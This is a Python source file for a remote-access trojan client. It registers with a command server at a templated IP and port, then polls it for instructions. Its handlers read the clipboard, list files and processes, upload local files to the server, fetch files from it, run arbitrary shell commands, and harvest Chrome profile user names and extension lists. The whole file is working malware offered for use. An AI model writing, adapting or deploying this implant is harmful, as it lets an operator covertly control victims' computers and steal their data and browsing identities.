import requests
import time
import uuid
import os
import subprocess
import pyperclip
import psutil


ip = "{ip}"
port = "{port}"
server_url = "http://"+ip+":"+port+"/client"
#server_url = "http://127.0.0.1:8080/client"
client_uuid = str(uuid.uuid4())

print(client_uuid)
try:
    response = requests.post(server_url, headers={"UUID": client_uuid})
    print("Register Response:", response.text)
except requests.RequestException as e:
    print("Failed to register with server:", e)

def list_files():
    try:
        files = os.listdir('.')
        result = "\n".join(files)
        return result
    except Exception as e:
        return "Error listing files: " + str(e)

def get_clipboard():
    try:
        clipboard_content = pyperclip.paste()
        return clipboard_content
    except Exception as e:
        return "Error getting clipboard content: " + str(e)
    
def download_file(file_path, server_url,save_path):
    url = f"{server_url}/download?filename={file_path}"
    try:
        print(url)
        response = requests.get(url, stream=True,headers={"UUID": client_uuid})
        if response.status_code == 200:
            with open(save_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            result = f"File downloaded successfully: {save_path}"
        else:
            result = f"Failed to download file. Status: {response.status_code}, Response: {response.text}"
    except Exception as e:
        result = f"Error downloading file: {e}"
    return result
    
def upload_file(file_path, server_url):
    if not os.path.exists(file_path):
        print(f"Error: The file '{file_path}' does not exist.")
        return
    
    url = f"{server_url}/upload"
    try:
        with open(file_path, 'rb') as file:
            files = {'file': file}
            print(url)
            response = requests.post(url, files=files,headers={"UUID": client_uuid})
            
            if response.status_code == 200:
                result = "File uploaded successfully."
            else:
                result = f"Failed to upload file. Status: {response.status_code}, Response: {response.text}"
    except Exception as e:
        result = f"Error uploading file: {e}"
    return result

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, text=True)
        return output
    except subprocess.CalledProcessError as e:
        return f"Error executing command: " + str(e)

def list_processes():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            processes.append(proc.info)
        return processes
    except Exception as e:
        return "Error listing processes: " + str(e)
        
def get_chrome_info():
    local_state_path = f'/Users/{os.getlogin()}/Library/Application Support/Google/Chrome/Local State'
    output = []

    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.load(file)

    if 'profile' in local_state and 'last_active_profiles' in local_state['profile']:
        output.append("\nLast active profiles:")
        output.append(str(local_state['profile']['last_active_profiles']))
    else:
        output.append("\nCannot find last_active_profiles.")

    if 'profile' in local_state and 'last_used' in local_state['profile']:
        output.append("\nLast used profile:")
        output.append(str(local_state['profile']['last_used']))
    else:
        output.append("\nCannot find last_used.")

    if 'profile' in local_state and 'info_cache' in local_state['profile']:
        output.append("\nUser names in profile.info_cache:")
        for profile_name, profile_info in local_state['profile']['info_cache'].items():
            if 'user_name' in profile_info:
                user_name = profile_info['user_name']
                output.append(f" - Profile: {profile_name}, User Name: {user_name}")
                
                extension_dir = f'Library/Application Support/Google/Chrome/{profile_name}/Local Extension Settings'
                
                if os.path.exists(extension_dir):
                    extensions = os.listdir(extension_dir)
                    output.append(f"   Extensions for {profile_name}:")
                    for ext in extensions:
                        output.append(f"     - {ext}")
                else:
                    output.append(f"   Directory does not exist: {extension_dir}")
            else:
                output.append(f" - Profile: {profile_name}, cannot find user_name.")
        output.append("Search extension by https://chrome.google.com/webstore/detail/TEXT/{id}")
    else:
        output.append("\nCannot find profile.info_cache.")
    
    return "\n".join(output)

def handle_command(command):
    try:
        if command == "list_files":
            result = list_files()
        elif command == "get_clipboard":
            result = get_clipboard()
        elif command.startswith("download_file "):
            upload_path = command.split(" ", 1)[1]
            save_path = os.path.basename(upload_path)
            result = download_file(upload_path, server_url, save_path)
        elif command.startswith("upload_file "):
            result = upload_file(command.split(" ", 1)[1], server_url)
        elif command.startswith("execute_command "):
            result = execute_command(command.split(" ", 1)[1])
        elif command == "list_processes":
            result = list_processes()
        elif command == "get_chrome_info":
            result = get_chrome_info()
        else:
            result = "Unknown command"
    except Exception as e:
        return {"status": "error", "message": str(e)}
    return result

while True:
    try:
        response = requests.get(server_url, headers={"UUID": client_uuid}, timeout=30)
        server_data = response.json()
        print("Server Response:", server_data)

        if "command" in server_data:
            command = server_data["command"]
            result = handle_command(command)
            print("Command Result:", result)
            requests.post(server_url, headers={"UUID": client_uuid}, json={"command": command,"result": result})
    except requests.ConnectionError as e:
        print("Connection error, retrying in 300 seconds:", e)
        time.sleep(300)
    except requests.RequestException as e:
        print("Request error:", e)
    except Exception as e:
        print("Unexpected error:", e)
    time.sleep(5)

